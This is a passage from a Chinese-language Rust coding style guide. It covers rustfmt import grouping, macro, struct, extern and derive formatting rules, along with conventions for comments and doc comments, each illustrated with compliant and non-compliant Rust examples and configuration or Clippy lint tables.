<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt11-导入模块分组应该具有良好的可读性"><a class="header" href="#pfmt11-导入模块分组应该具有良好的可读性">P.FMT.11 导入模块分组应该具有良好的可读性</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>导入同一模块的类型，应该置于同一个块内（<code>imports_granularity=&quot;Crate&quot;</code>）。</li>
<li>模块导入应该按以下规则进行分组（<code>group_imports=&quot;StdExternalCrate&quot;</code>）：
<ul>
<li>导入来自 <code>std</code>、<code>core</code> 和 <code>alloc</code>的模块需要置于前面。</li>
<li>导入来自 第三方库的模块 应该置于中间。</li>
<li>导入来自本地 <code>self</code>、<code>super</code>和<code>crate</code>前缀的模块，置于后面。</li>
</ul>
</li>
<li>分组内使用字典序进行排序（<code>reorder_imports=true</code>）。</li>
</ol>
<blockquote>
<p>说明： 默认 rustfmt 不会对导入的模块自动分组，而是保留开发者的导入顺序。所以，这里需要修改 rustfmt 默认配置，才能让rustfmt应用此规则，但因为这几个配置项暂时未稳定，所以需要在 Nightly 下使用。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<p>例1:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 同一模块类型应该置于同一个块内
// 当 `imports_granularity=&quot;Preserve&quot;`
use foo::b;
use foo::b::{f, g};
use foo::{a, c, d::e};
use qux::{h, i};
<span class="boring">}
</span></code></pre></pre>
<p>例2:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：当按默认值设置时，模块导入比较乱，影响可读性
use super::update::convert_publish_payload;
use chrono::Utc;

use alloc::alloc::Layout;
use juniper::{FieldError, FieldResult};
use uuid::Uuid;

use std::sync::Arc;

use broker::database::PooledConnection;

use super::schema::{Context, Payload};
use crate::models::Event;
use core::f32;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>例1:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 当 `imports_granularity=&quot;Crate&quot;`
use foo::{
    a, b,
    b::{f, g},
    c,
    d::e,
};
use qux::{h, i};
<span class="boring">}
</span></code></pre></pre>
<p>例2:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 当 `group_imports=&quot;StdExternalCrate` 且 `reorder_imports=true`
use alloc::alloc::Layout;
use core::f32;
use std::sync::Arc;

use broker::database::PooledConnection;
use chrono::Utc;
use juniper::{FieldError, FieldResult};
use uuid::Uuid;

use super::schema::{Context, Payload};
use super::update::convert_publish_payload;
use crate::models::Event;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#imports_granularity"><code>imports_granularity</code></a></td><td>（Preserve（默认），Crate(推荐)）</td><td>No</td><td>默认保留开发者的模块导入顺序</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#reorder_imports"><code>reorder_imports</code></a></td><td>true（默认）</td><td>No</td><td>模块分组内根据模块首字母按字典序进行排序</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#group_imports"><code>group_imports</code></a></td><td>（Preserve（默认）， StdExternalCrate（建议））</td><td>No</td><td>默认保留开发者的模块导入分组</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt12-声明宏分支应该具有良好的可读性"><a class="header" href="#pfmt12-声明宏分支应该具有良好的可读性">P.FMT.12 声明宏分支应该具有良好的可读性</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>在声明宏中，模式匹配分支（<code>=&gt;</code> 左侧）应该使用紧凑格式（<code>format_macro_matchers=true</code>）。</li>
<li>而分支代码体（<code>=&gt;</code> 右侧） 使用宽松格式。</li>
</ol>
<blockquote>
<p>说明：因为这里需要修改<code>format_macro_matchers</code>的默认值，且该配置项并未 Stable ，所以需要在 Nightly 下修改配置项的值以便使用。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 匹配分支使用了宽松格式
// 当 `format_macro_matchers=false`且 `format_macro_bodies=true`
macro_rules! foo {
    ($a: ident : $b: ty) =&gt; {
        $a(42): $b;
    };
    ($a: ident $b: ident $c: ident) =&gt; {
        $a = $b + $c;
    };
}

// 不符合： 分支代码体使用了紧凑格式
// 当 `format_macro_matchers=false`且 `format_macro_bodies=false`
macro_rules! foo {
    ($a: ident : $b: ty) =&gt; {
        $a(42):$b;
    };
    ($a: ident $b: ident $c: ident) =&gt; {
        $a=$b+$c;
    };
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 当 `format_macro_matchers=true` 且 `format_macro_bodies=true`
macro_rules! foo {
    // 符合：匹配分支紧凑格式， `$a:ident` 和 `$b:ty` 各自配对
    ($a:ident : $b:ty) =&gt; {
        $a(42): $b; // 在代码体内，则宽松一点
    };
    // 符合
    ($a:ident $b:ident $c:ident) =&gt; {
        $a = $b + $c;
    };
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#format_macro_matchers"><code>format_macro_matchers</code></a></td><td>（false（默认），true(建议)）</td><td>No</td><td>声明宏 模式匹配分支（<code>=&gt;</code> 左侧）中要使用紧凑格式</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#format_macro_bodies"><code>format_macro_bodies</code></a></td><td>true（默认）</td><td>No</td><td>声明宏分支代码体（<code>=&gt;</code> 右侧） 使用宽松格式</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt13--具名结构体字段初始化时不要省略字段名"><a class="header" href="#pfmt13--具名结构体字段初始化时不要省略字段名">P.FMT.13  具名结构体字段初始化时不要省略字段名</a></h2>
<p><strong>【描述】</strong></p>
<p>因为本规则依赖于rustfmt，而rustfmt会根据相应配置项对代码进行自动更改，为了确保不会因为rustfmt配置项的更改而导致代码错误，请在遵循rustfmt使用注意事项的基础上遵循本规则：</p>
<ol>
<li>省略字段名的时候需要注意变量名和字段名保持一致。</li>
<li>变量名和字段名不一致的情况下，不要省略字段名。</li>
</ol>
<blockquote>
<p>注意：如果将 rustfmt 默认配置 <code>use_field_init_shorthand</code>改为<code>true</code>时，有可能会发生代码被修改错误的情况。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">struct Foo {
    a: u32, // 注意这里是 a
    y: u32,
    z: u32,
}

fn main() {
    let x = 1;
    let y = 2;
    let z = 3;
    // 不符合： 如果允许省略字段名，并且rustfmt 配置 `use_field_init_shorthand`改为`true`时，
    //        下面代码中字段`a`就会被rustfmt删除，变为 `Foo{x, y, z}`，从而造成错误
    // rustfmt 无法检查这个错误，但是编译时能检查出来，所以要遵循rustfmt使用注意事项就不会出问题
    let a = Foo { a: x, y, z };
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
struct Foo {
    a: u32,
    y: u32,
    z: u32,
}

fn main() {
    let x = 1;
    let y = 2;
    let z = 3;
    // 符合
    let a = Foo { a: x, y: y, z: z };
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#use_field_init_shorthand"><code>use_field_init_shorthand</code></a></td><td>false（默认）</td><td>Yes</td><td>具名结构体字段初始化不能省略字段名</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt14--extern-外部函数需要显式指定-c-abi"><a class="header" href="#pfmt14--extern-外部函数需要显式指定-c-abi">P.FMT.14  extern 外部函数需要显式指定 C-ABI</a></h2>
<p><strong>【描述】</strong></p>
<p>当使用 <code>extern</code> 指定外部函数时，建议显式指定 <code>C-ABI</code>。</p>
<p>虽然 <code>extern</code> 不指定的话默认就是 <code>C-ABI</code>，但是 Rust 语言显式指定是一种约定俗成。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：不要省略 C-ABI 指定
extern {
    pub static lorem: c_int;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
extern &quot;C&quot; {
    pub static lorem: c_int;
}

extern &quot;Rust&quot; {
    type MyType;
    fn f(&amp;self) -&gt; usize;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#force_explicit_abi"><code>force_explicit_abi</code></a></td><td>true（默认）</td><td>Yes</td><td>extern 外部函数总是要指定 ABI</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt15--解构元组的时候允许使用来指代剩余元素"><a class="header" href="#pfmt15--解构元组的时候允许使用来指代剩余元素">P.FMT.15  解构元组的时候允许使用<code>..</code>来指代剩余元素</a></h2>
<p><strong>【描述】</strong></p>
<p><code>rustfmt</code> 可以由 <code>condense_wildcard_suffixes</code> 配置项来格式化此规则，其默认选项是 false，表示不允许 解构元组的时候使用<code>..</code>来指代剩余元素，所以需要修改默认配置项的值为 <code>true</code> 才符合规范。</p>
<p><strong>【反例】</strong></p>
<p>默认情况下，rustfmt 不会自动更改代码，会保留原来的写法。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合： 应该使用`..`
    let (lorem, ipsum, _, _) = (1, 2, 3, 4);
    let (lorem, _,ipsum, _, _) = (1, 2, 3, 4, 5);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>设置 <code>condense_wildcard_suffixes = true</code> 时，会强行更改代码为下面形式。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 符合
    let (lorem, ipsum, ..) = (1, 2, 3, 4);
    let (lorem, _,ipsum, ..) = (1, 2, 3, 4, 5);
}
</code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#condense_wildcard_suffixes"><code>condense_wildcard_suffixes</code></a></td><td>false（默认） true （推荐）</td><td>No</td><td>解构元组的时候是否允许使用<code>..</code>来指代剩余元素</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt16--不要将派生宏中多个不相关的特质合并为同一行"><a class="header" href="#pfmt16--不要将派生宏中多个不相关的特质合并为同一行">P.FMT.16  不要将派生宏中多个不相关的特质合并为同一行</a></h2>
<p><strong>【描述】</strong></p>
<p>不要将派生宏（Derive）中多个特质（trait）合并为同一行，这样可以增加代码可读性，明确语义。</p>
<p><code>rustfmt</code> 配置项 <code>merge_derives</code> 用于匹配此格式，其默认值是让派生宏中多个特质在同一行，所以需要修改其默认值。</p>
<p>说明： <code>rustfmt</code> 并不会识别哪些特质相关，所以需要开发者手工指定好。</p>
<p><strong>【反例】</strong></p>
<p>当使用默认设置  <code>merge_derives = true</code> 时，不符合。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：不相关的特质放到一行
#[derive(Eq, PartialEq, Debug, Copy, Clone)]
pub enum Foo {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>修改默认设置 <code>merge_derives = false</code>，符合。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
#[derive(Eq, PartialEq)]
#[derive(Debug)]
#[derive(Copy, Clone)]
pub enum Foo {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#merge_derives"><code>merge_derives</code></a></td><td>true（默认） false（推荐）</td><td>Yes</td><td>是否将多个 Derive 宏合并为同一行</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="23-注释与文档"><a class="header" href="#23-注释与文档">2.3 注释与文档</a></h1>
<p>在 Rust 中，注释分为两类：普通注释和文档注释。普通注释使用 <code>//</code> 或 <code>/* ... */</code>，文档注释使用 <code>///</code>、<code>//!</code> 或 <code>/** ... **/</code>。</p>
<p>在原则和规则中提到「注释」时，包括普通注释和文档注释。当提到「文档」时，特指文档注释。</p>
<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
<ol>
<li><a href="https://github.com/rust-lang/rfcs/blob/master/text/0505-api-comment-conventions.md">RFC 505: API 注释约定</a></li>
<li><a href="https://github.com/rust-lang/rfcs/blob/master/text/1574-more-api-documentation-conventions.md">RFC 1574: API 文档约定</a></li>
<li><a href="https://www.tangramvision.com/blog/making-great-docs-with-rustdoc">Making Great Docs with Rustdoc</a></li>
<li><a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html">Rust Doc book</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcmt01-代码能做到自注释文档要干练简洁"><a class="header" href="#pcmt01-代码能做到自注释文档要干练简洁">P.CMT.01 代码能做到自注释，文档要干练简洁</a></h2>
<p><strong>【描述】</strong></p>
<p>一、代码能够做到自注释，避免冗余的普通代码注释。</p>
<p>注释固然很重要, 但最好的代码应当本身就是文档。有意义的类型名、函数名和变量名, 要远胜过要用注释解释的含糊不清的名字。当有意义的类型名、函数名和变量名还不能表达完整的语义时，再使用注释。</p>
<p>不要描述显而易见的现象, 永远不要用自然语言翻译代码作为注释。</p>
<p>二、文档注释要干练简洁：</p>
<ol>
<li>文档注释中内容用语应该尽量简短精干，不宜篇幅过长。请确保你的代码注释良好并且易于他人理解，好的注释能够传达上下文关系和代码目的。</li>
<li>注释内容始终围绕两个关键点来构建：
<ul>
<li>What : 用于阐述代码为了什么而实现。</li>
<li>how : 用于阐述代码如何去使用。</li>
</ul>
</li>
<li>注释和文档注释使用的自然语言要保持一致。</li>
<li>Rust 项目文档应该始终基于 <code>rustdoc</code> 工具来构建，<code>rustdoc</code> 支持 Markdown 格式，为了使得文档更加美观易读，文档注释应该使用 Markdown 格式。</li>
</ol>
<p><strong>【正例】</strong> </p>
<p>模块级文档，来自于 Rust 标准库<code>std::vec</code>：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合

//! # The Rust core allocation and collections library
//!
//! This library provides smart pointers and collections for managing
//! heap-allocated values.
//!
//! This library, like libcore, normally doesn’t need to be used directly
//! since its contents are re-exported in the [`std` crate](../std/index.html).
//! Crates that use the `#![no_std]` attribute however will typically
//! not depend on `std`, so they’d use this crate instead.
//!
//! ## Boxed values
//!
//! The [`Box`] type is a smart pointer type. There can only be one owner of a
//! [`Box`], and the owner can decide to mutate the contents, which live on the
//! heap.
<span class="boring">}
</span></code></pre></pre>
<p>普通文档注释示例，来自标准库<code>Vec::new</code>方法：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合

/// Constructs a new, empty `Vec&lt;T&gt;`.
///
/// The vector will not allocate until elements are pushed onto it.
///
/// # Examples
///
/// ```
/// # #![allow(unused_mut)]
/// let mut vec: Vec&lt;i32&gt; = Vec::new();
/// ```
#[inline]
#[rustc_const_stable(feature = &quot;const_vec_new&quot;, since = &quot;1.39.0&quot;)]
#[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
pub const fn new() -&gt; Self {
    Vec { buf: RawVec::NEW, len: 0 }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcmt02--注释应该有宽度限制"><a class="header" href="#pcmt02--注释应该有宽度限制">P.CMT.02  注释应该有宽度限制</a></h2>
<p><strong>【描述】</strong></p>
<p>每行注释的宽度不能过长，需要设置一定的宽度，不超过120，有助于提升可读性。</p>
<p><code>rustfmt</code>中通过<code>comment_width</code>配合 <code>wrap_comments</code> 配置项，可将超过宽度限制的注释自动分割为多行。</p>
<p>注意：<code>rustfmt</code>的 <code>use_small_heuristics</code>配置项并不包括<code>comment_width</code>。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
// Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>当 <code>comment_width=80</code> 且 <code>wrap_comments=true</code>时。</p>
<p>注意：这里 <code>wrap_comments</code>并未使用默认值，需要配置为 true。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// Lorem ipsum dolor sit amet, consectetur adipiscing elit,
// sed do eiusmod tempor incididunt ut labore et dolore
// magna aliqua. Ut enim ad minim veniam, quis nostrud
// exercitation ullamco laboris nisi ut aliquip ex ea
// commodo consequat.
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#comment_width"><code>comment_width</code></a></td><td>80（默认）</td><td>No</td><td>指定一行注释允许的最大宽度</td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#wrap_comments"><code>wrap_comments</code></a></td><td>false（默认），true（建议）</td><td>No</td><td>运行多行注释按最大宽度自动换成多行注释</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcmt03--使用行注释而避免使用块注释"><a class="header" href="#pcmt03--使用行注释而避免使用块注释">P.CMT.03  使用行注释而避免使用块注释</a></h2>
<p><strong>【描述】</strong></p>
<p>尽量使用行注释（<code>//</code> 或 <code>///</code>），而非块注释。这是Rust社区的约定俗成。</p>
<p>对于文档注释，仅在编写模块级文档时使用 <code>//!</code>，在其他情况使用 <code>///</code>更好。</p>
<p>说明： <code>#![doc]</code> 和 <code>#[doc]</code> 对于简化文档注释有特殊作用，没有必要通过 <code>rustfmt</code> 将其强制转化为 <code>//!</code> 或 <code>///</code> 。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合

/*
 * Wait for the main task to return, and set the process error code
 * appropriately.
 */
mod tests {
    //! This module contains tests

    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>当 <code>normalize_comments = true</code>  时：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合

// Wait for the main task to return, and set the process error code
// appropriately.

// 符合
// 在使用 `mod` 关键字定义模块时，在 `mod`之上使用 `///` 更好。

/// This module contains tests
mod tests {
    // ...
}

// 符合
#[doc = &quot;Example item documentation&quot;]
pub enum Foo {}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【rustfmt 配置】</strong></p>
<table><thead><tr><th>对应选项</th><th>可选值</th><th>是否 stable</th><th>说明</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#normalize_comments"><code>normalize_comments</code></a></td><td>false（默认） true（推荐）</td><td>No</td><td>将 <code>/**/</code> 注释转为 <code>//</code></td></tr>
<tr><td><a href="https://rust-lang.github.io/rustfmt/?#normalize_doc_attributes"><code>normalize_doc_attributes</code></a></td><td>false（默认）</td><td>No</td><td>将 <code>#![doc]</code> 和 <code>#[doc]</code> 注释转为 <code>//!</code> 和 <code>///</code></td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcmt04--文件头注释包含版权说明"><a class="header" href="#pcmt04--文件头注释包含版权说明">P.CMT.04  文件头注释包含版权说明</a></h2>
<p><strong>【描述】</strong></p>
<p>文件头（即，模块级）注释应先包含版权说明。如果文件头注释需要增加其他内容，可以在版权说明下面补充。</p>
<p>可以包括：</p>
<ol>
<li>文件功能说明。</li>
<li>作者。</li>
<li>创建日期 和 最后修改日期。</li>
<li>注意事项。</li>
<li>开源许可证(比如, Apache 2.0, BSD, LGPL, GPL)。</li>
<li>其他。</li>
</ol>
<p>版权说明格式如下：</p>
<ul>
<li>中文版：<code>版权所有（c）XXX 技术有限公司 2015-2022</code>。</li>
<li>英文版： <code>Copyright (c) XXX Technologies Co.Ltd. 2015-2022. All rights reserved. Licensed under Apache-2.0.</code></li>
</ul>
<p>其内容可以进行调整，参加下面详细说明：</p>
<ul>
<li><code>2015-2022</code> 根据实际需要可以修改。2015是文件首次创建年份，2022是文件最后修改年份。可以只写一个创建年份，后续如果经常修改则无需修改版权声明。</li>
<li>如果是内部使用，则无需增加 <code>All rights reserved</code>。</li>
<li><code>Licensed under Apache-2.0.</code>，如果是开源则可以增加许可证声明。</li>
</ul>
<p>编写版权注释时注意事项：</p>
<ul>
<li>版权注释应该从文件头顶部开始写。</li>
<li>文件头注释首先包含“版权说明”，然后紧跟其他内容。</li>
<li>可选内容应按需添加，避免空有格式没有内容的情况。</li>
<li>保持统一格式，具体格式由项目或更大的范围统一制定。</li>
<li>保持版面工整，换行注意对齐。</li>
</ul>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 版权所有（c）XXX 技术有限公司 2015-2022。

// Or

// 符合
// Copyright (c) XXX Technologies Co.Ltd. 2015-2022. 
// All rights reserved. Licensed under Apache-2.0.
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcmt05--在注释中使用-fixme-和-todo-来帮助任务协作"><a class="header" href="#pcmt05--在注释中使用-fixme-和-todo-来帮助任务协作">P.CMT.05  在注释中使用 <code>FIXME</code> 和 <code>TODO</code> 来帮助任务协作</a></h2>
<p><strong>【描述】</strong></p>
<p>通过在注释中开启 <code>FIXME</code> 和 <code>TODO</code> 可以方便协作。正式发布版本可以不做此类标注。</p>
<p>注意：此条目不适于使用 <code>rustfmt</code>相关配置项 <code>report_fixme</code> 和 <code>report_todo</code>，在 <code>rustfmt</code> v2.0 中已经移除这两项配置。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// TODO(calebcartwright): consider enabling box_patterns feature gate
fn annotation_type_for_level(level: Level) -&gt; AnnotationType {
    match level {
        Level::Bug | Level::Fatal | Level::Error =&gt; AnnotationType::Error,
        Level::Warning =&gt; AnnotationType::Warning,
        Level::Note =&gt; AnnotationType::Note,
        Level::Help =&gt; AnnotationType::Help,
        // FIXME(#59346): Not sure how to map these two levels
        Level::Cancelled | Level::FailureNote =&gt; AnnotationType::Error,
        Level::Allow =&gt; panic!(&quot;Should not call with Allow&quot;),
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcmt01-在公开的返回result类型的函数文档中增加-error-注释"><a class="header" href="#gcmt01-在公开的返回result类型的函数文档中增加-error-注释">G.CMT.01 在公开的返回<code>Result</code>类型的函数文档中增加 Error 注释</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在公开（pub）的返回<code>Result</code>类型的函数文档中，建议增加 <code># Error</code> 注释来解释什么场景下该函数会返回什么样的错误类型，方便用户处理错误。</p>
<p>说明： 该规则可以通过 cargo clippy 来检测，但默认不会警告。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::missing_errors_doc)]

<span class="boring">fn main() {
</span>use std::io;
// 不符合： Clippy 会警告 &quot;warning: docs for function returning `Result` missing `# Errors` section&quot;
pub fn read(filename: String) -&gt; io::Result&lt;String&gt; {
    unimplemented!();
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::missing_errors_doc)]

<span class="boring">fn main() {
</span>use std::io;
// 符合：增加了规范的 Errors 文档注释

/// # Errors
///
/// Will return `Err` if `filename` does not exist or the user does not have
/// permission to read it.
pub fn read(filename: String) -&gt; io::Result&lt;String&gt; {
    unimplemented!();
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>默认 level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#missing_errors_doc">missing_errors_doc </a></td><td>yes</td><td>no</td><td>Style</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcmt02--如果公开的api在某些情况下会发生panic则相应文档中需增加-panic-注释"><a class="header" href="#gcmt02--如果公开的api在某些情况下会发生panic则相应文档中需增加-panic-注释">G.CMT.02  如果公开的API在某些情况下会发生Panic，则相应文档中需增加 Panic 注释</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>在公开（pub）函数文档中，建议增加 <code># Panic</code> 注释来解释该函数在什么条件下会 Panic，便于使用者进行预处理。</p>
<p>说明： 该规则通过 cargo clippy 来检测。默认不会警告。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::missing_panics_doc)]

<span class="boring">fn main() {
</span>// 不符合：没有添加 Panic 相关的文档注释，Clippy会报错 &quot;warning: docs for function which may panic missing `# Panics` section&quot;。
pub fn divide_by(x: i32, y: i32) -&gt; i32 {
    if y == 0 {
        panic!(&quot;Cannot divide by 0&quot;)
    } else {
        x / y
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::missing_panics_doc)]

<span class="boring">fn main() {
</span>// 符合：增加了规范的 Panic 注释
/// # Panics
///
/// Will panic if y is 0
pub fn divide_by(x: i32, y: i32) -&gt; i32 {
    if y == 0 {
        panic!(&quot;Cannot divide by 0&quot;)
    } else {
        x / y
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>默认 level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#missing_panics_doc">missing_panics_doc </a></td><td>yes</td><td>no</td><td>Style</td><td>allow</td></tr>
</tbody></table>
<p>默认为 <code>allow</code>，但是此规则需要设置<code>#![warn(clippy::missing_panics_doc)]</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcmt03--在文档注释中要使用空格代替-tab"><a class="header" href="#gcmt03--在文档注释中要使用空格代替-tab">G.CMT.03  在文档注释中要使用空格代替 tab</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 代码风格中提倡使用<strong>四个空格</strong>代替tab，在文档注释中也应该统一使用<strong>四个空格</strong>。</p>
<p><strong>【反例】</strong></p>
<p>下面文档注释中使用了 tab。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：文档注释中使用了 tab 缩进
///
/// Struct to hold two strings:
/// 	- first		one
/// 	- second	one
pub struct DoubleString {
   ///
   /// 	- First String:
   /// 		- needs to be inside here
   first_string: String,
   ///
   /// 	- Second String:
   /// 		- needs to be inside here
   second_string: String,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合：文档注释中使用了四个空格缩进
///
/// Struct to hold two strings:
///     - first        one
///     - second    one
pub struct DoubleString {
   ///
   ///     - First String:
   ///         - needs to be inside here
   first_string: String,
   ///
   ///     - Second String:
   ///         - needs to be inside here
   second_string: String,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>默认 level</th></tr></thead><tbody>
